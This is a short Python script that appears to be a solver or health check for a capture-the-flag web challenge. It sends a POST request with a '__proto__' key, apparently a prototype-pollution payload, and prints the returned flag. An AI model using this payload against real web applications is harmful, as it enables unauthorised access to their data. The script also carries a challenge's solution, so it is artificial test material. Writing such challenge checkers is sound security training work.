#!/usr/bin/env python3

import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python3 {} http://<ip>:<port>/".format(sys.argv[0]))
    print("Example: python3 {} http://127.0.0.1:7777/".format(sys.argv[0]))
    exit()

url = sys.argv[1]

r = requests.post(url + "data", data = {"key":"__proto__", "key2":"note"})

if "hfctf{" not in r.text:
    print("Challenge not working")
    exit(1)

print("Challenge working, here is the flag:")
print(r.text)

